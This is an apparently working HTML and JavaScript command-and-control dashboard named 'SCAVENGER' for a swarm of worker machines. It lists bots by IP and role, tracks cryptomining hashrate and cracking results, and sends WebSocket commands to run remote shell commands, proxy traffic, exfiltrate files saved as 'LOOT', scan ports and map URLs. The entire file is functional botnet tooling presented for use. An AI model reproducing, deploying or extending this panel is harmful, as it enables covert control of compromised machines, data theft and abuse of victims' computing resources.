<!DOCTYPE html>
<html>
<head>
    <title>SCAVENGER // CONTROL</title>
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1a1a1a;
            --win-bg: #000000;
            --border-light: #555;
            --border-dark: #000;
            --header-bg: #000080; /* Classic Blue Header */
            --header-text: #fff;
            --text-main: #e0e0e0;
            --accent: #ffb000; /* Industrial Amber */
            --alert: #ff3333;
        }

        body { 
            background-color: var(--bg-color); 
            /* Subtle grid pattern background */
            background-image: 
                linear-gradient(var(--border-light) 1px, transparent 1px),
                linear-gradient(90deg, var(--border-light) 1px, transparent 1px);
            background-size: 20px 20px;
            background-position: center center;
            
            font-family: 'VT323', monospace; /* The Unique Font */
            font-size: 20px; /* VT323 needs to be big to look good */
            margin: 0; padding: 15px; 
            color: var(--text-main);
            height: 100vh;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            gap: 15px;
            overflow: hidden;
        }

        /* --- THE WINDOW SYSTEM --- */
        .win-frame {
            border: 2px solid var(--border-light);
            background: var(--win-bg);
            box-shadow: 4px 4px 0px #000; /* Hard shadow */
            display: flex;
            flex-direction: column;
        }

        .title-bar {
            background: var(--header-bg);
            color: var(--header-text);
            padding: 2px 8px;
            font-size: 22px;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid var(--border-light);
        }
        
        .title-btn {
            background: #c0c0c0;
            color: black;
            font-weight: bold;
            width: 20px;
            height: 20px;
            text-align: center;
            line-height: 18px;
            font-family: sans-serif;
            font-size: 14px;
            cursor: pointer;
            box-shadow: inset 1px 1px #fff, inset -1px -1px #000;
        }

        .win-content {
            padding: 10px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }

        /* --- LAYOUT GRID --- */
        .top-deck {
            display: grid;
            grid-template-columns: 2fr 1fr; /* Logs take more space, Stats take less */
            gap: 15px;
            height: 60%; 
        }

        /* --- AGENT TABLE --- */
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; border-bottom: 1px dashed var(--border-light); color: var(--accent); font-weight: normal; }
        td { padding: 2px 0; }
        .row-mining { color: #fff; }
        .row-proxy { color: #d400ff; } /* Hot Purple */
        .row-idle { color: #555; }

        /* --- METRICS --- */
        .big-stat {
            font-size: 48px;
            color: var(--accent);
            line-height: 1;
        }
        .stat-label { color: #888; text-transform: uppercase; }

        /* --- LOGS --- */
        #log-window {
            overflow-y: scroll;
            height: 100%;
            padding-right: 5px;
            background: #050505;
        }
        .log-entry { 
            margin-bottom: 2px; 
            border-bottom: 1px solid #111;
        }
        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 10px; background: #1a1a1a; }
        ::-webkit-scrollbar-thumb { background: var(--border-light); border: 1px solid #000; }

        /* --- CMD INPUT --- */
        .cmd-frame {
            background: #000;
            border: 2px solid var(--border-light);
            padding: 10px;
            display: flex;
            align-items: center;
            box-shadow: 4px 4px 0px #000;
        }
        input {
            background: transparent;
            border: none;
            color: var(--accent);
            font-family: 'VT323', monospace;
            font-size: 24px;
            width: 100%;
            outline: none;
            text-transform: uppercase;
        }
        input::placeholder { color: #333; }

    </style>
</head>
<body>

    <div class="top-deck">
        
        <div class="win-frame">
            <div class="title-bar">
                <span>// SYSTEM_LOGS</span>
                <div class="title-btn">X</div>
            </div>
            <div class="win-content">
                <div id="log-window"></div>
            </div>
        </div>

        <div class="win-frame">
            <div class="title-bar">
                <span>// SWARM_STATE</span>
                <div class="title-btn">_</div>
            </div>
            <div class="win-content" style="gap: 20px;">
                
                <div>
                    <div class="stat-label">AGGREGATE HASHRATE</div>
                    <div id="hashCount" class="big-stat">0.00</div>
                    <div style="font-size:16px;">MH/s</div>
                </div>

                <div>
                    <div class="stat-label">CURRENT JOB</div>
                    <div style="border: 2px solid var(--border-light); height: 20px; margin-top: 5px; background: #111;">
                        <div id="taskBar" style="width: 0%; height: 100%; background: var(--accent);"></div>
                    </div>
                    <div id="percText" style="text-align: right; color: var(--accent);">IDLE</div>
                </div>

                <div style="flex-grow: 1; overflow-y: auto; border-top: 2px solid var(--border-light); padding-top: 5px;">
                    <table>
                        <thead>
                            <tr><th>UNIT</th><th>IP</th><th>ACT</th></tr>
                        </thead>
                        <tbody id="workerTable"></tbody>
                    </table>
                </div>

            </div>
        </div>
    </div>

    <div class="cmd-frame">
        <span style="color: var(--accent); margin-right: 10px;">ROOT@SCAVENGER:~#</span>
        <input type="text" id="cmdInput" placeholder="AWAITING INSTRUCTION..." autocomplete="off">
    </div>

    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = protocol + '//' + window.location.host;
        let ws; const logDiv = document.getElementById('log-window');

        function connect() {
            let key = localStorage.getItem('access_key');
            if (!key) {
                key = prompt("SECURE TERMINAL // ENTER KEY:");
                if (key) localStorage.setItem('access_key', key);
            }
            ws = new WebSocket(wsUrl + '?key=' + key);
            ws.onopen = () => { log("UPLINK SECURED.", "#0f0"); ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); };
            ws.onclose = () => { log("SIGNAL LOST. RECONNECTING...", "#f00"); setTimeout(connect, 3000); };
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if(data.type === 'STATS') updateDashboard(data);
                if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status} > ${data.data.url}`, "#d400ff");
                if(data.type === 'SHELL_LOG') logHTML(data.output);
                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] SAVED: ${data.filename}`, "#0f0"); downloadFile(data.filename, data.data); }
                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} >> ${data.data.mentions}`, "#ffb000"); }
                if(data.type === 'MAP_LOG') handleMapLog(data.data);
                if(data.type === 'SCAN_LOG') handleScanLog(data.data);
            };
        }

        function updateDashboard(data) {
            document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2);
            const tbody = document.getElementById('workerTable'); tbody.innerHTML = '';
            data.workers.forEach(w => {
                const row = document.createElement('tr');
                let cls = 'row-mining';
                if (w.role === 'PROXYING') cls = 'row-proxy';
                if (w.role === 'IDLE') cls = 'row-idle';
                row.innerHTML = `<td style="color:#888">${w.id}</td><td>${w.ip}</td><td class="${cls}">${w.role}</td>`;
                tbody.appendChild(row);
            });
            if (data.goldenTicket) {
                document.getElementById('taskBar').style.width = "100%"; 
                document.getElementById('taskBar').style.backgroundColor = "#0f0";
                document.getElementById('percText').innerText = "CRACKED: " + data.goldenTicket;
            }
        }

        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                const cmd = this.value; this.value = '';
                if (cmd.startsWith('$ ')) ws.send(JSON.stringify({ type: 'SEND_SHELL_CMD', command: cmd.substring(2) }));
                else if (cmd.startsWith('curl ')) ws.send(JSON.stringify({ type: 'SEND_PROXY_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('download ')) ws.send(JSON.stringify({ type: 'SEND_EXFIL_CMD', path: cmd.split(' ')[1] }));
                else if (cmd.startsWith('snap ')) ws.send(JSON.stringify({ type: 'SEND_SNAPSHOT_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('snipe ')) ws.send(JSON.stringify({ type: 'SEND_SNIPE_CMD', ticker: cmd.split(' ')[1] }));
                else if (cmd.startsWith('map ')) ws.send(JSON.stringify({ type: 'SEND_MAP_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('scan ')) ws.send(JSON.stringify({ type: 'SEND_SCAN_CMD', ip: cmd.split(' ')[1] }));
                else if (cmd.startsWith('archive ')) ws.send(JSON.stringify({ type: 'SEND_ARCHIVE_CMD', url: cmd.split(' ')[1] }));
            }
        });

        function downloadFile(filename, base64) {
            const link = document.createElement('a'); link.href = `data:application/octet-stream;base64,${base64}`;
            link.download = filename; document.body.appendChild(link); link.click(); document.body.removeChild(link);
        }

        function log(msg, color = "#fff") {
            const line = document.createElement('div'); line.className = 'log-entry';
            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
            line.innerHTML = `<span style="color:#555">[${time}]</span> <span style="color:${color}">${msg}</span>`;
            logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
        }

        function logHTML(html) { log(html.replace(/\n/g, "<br>")); }
        function handleMapLog(res) { log(`[MAP] ${res.status} > /${res.path}`, res.status === 200 ? "#0f0" : "#d400ff"); }
        function handleScanLog(res) { log(`[HYDRA] PORT ${res.port} OPEN ON ${res.ip}`, "#f00"); }

        connect();
    </script>
</body>
</html>
